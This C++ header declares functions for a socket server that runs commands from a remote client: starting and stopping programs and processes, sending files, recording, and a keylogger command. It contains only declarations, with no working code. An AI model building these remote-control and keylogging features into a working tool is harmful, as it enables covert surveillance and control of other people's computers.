#pragma once

#include "Application/lib.h"
#include <map>
#include <set>
#include <string>
#include <filesystem>

// Function declarations
void handle_client(SOCKET clientSocket);
std::string receive_command(SOCKET sock);
std::string trim(const std::string& s);

// Command checking functions
bool is_start_program_command(const std::string& command);
bool is_start_process_command(const std::string& command);
bool is_stop_program_command(const std::string& command);
bool is_stop_process_command(const std::string& command);
bool is_keylogger_command(const std::string& command);

// Command processing functions
void process_send_file_command(SOCKET clientSocket, const std::string& command);
void process_keylogger_command(SOCKET clientSocket, const std::string& command);
void process_file_command(SOCKET clientSocket, const std::string& command);
void process_recording_command(SOCKET clientSocket, const std::string& command);
void process_simple_command(SOCKET clientSocket, const std::string& command);
void send_error_response(SOCKET clientSocket, const std::string& message);
void send_success_response(SOCKET clientSocket, const std::string& message);

// Socket configuration
void configure_socket_for_large_files(SOCKET clientSocket);